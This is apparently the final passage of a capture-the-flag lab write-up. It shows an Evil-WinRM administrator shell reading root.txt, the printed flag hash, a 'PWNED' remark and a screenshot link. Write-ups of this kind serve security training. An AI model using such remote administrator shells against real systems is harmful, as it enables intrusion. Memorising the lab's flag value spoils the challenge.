*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
d235ba6fe6d9f754a7710e8db3abedcf
```

***PWNED***

![](assets/Pasted%20image%2020260119182737.png)
